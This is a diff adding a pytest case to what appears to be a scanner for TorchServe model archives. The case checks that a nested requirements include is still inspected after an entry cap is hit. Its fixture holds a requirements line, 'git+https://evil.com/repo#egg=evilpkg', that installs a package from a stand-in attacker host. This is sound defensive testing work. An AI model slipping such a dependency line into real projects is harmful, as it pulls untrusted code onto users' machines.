@@ -1249,6 +1249,33 @@ def test_scan_flags_colliding_local_requirements_include_even_when_benign_alias_
     )
 
 
+def test_scan_follows_local_requirements_include_beyond_entry_processing_cap(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries=[
+            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
+            ("weights.bin", b"weights"),
+            ("requirements.txt", b"-r extra.txt\n"),
+            ("extra.txt", b"git+https://evil.com/repo#egg=evilpkg\n"),
+        ],
+        filename="requirements_include_after_entry_cap.mar",
+    )
+
+    result = TorchServeMarScanner(config={"max_mar_entries": 4}).scan(str(mar_path))
+
+    entry_limit_failures = _failed_checks(result, "TorchServe MAR Entry Limit")
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(entry_limit_failures) == 1
+    assert len(requirements_failures) == 1
+    assert any(
+        finding["reason"] == "git_install" and finding["requirements_file"] == "extra.txt"
+        for finding in requirements_failures[0].details.get("findings", [])
+    )
+
+
 def test_scan_accepts_clean_colliding_local_requirements_include_aliases(tmp_path: Path) -> None:
     manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
     mar_path = _create_mar_archive(
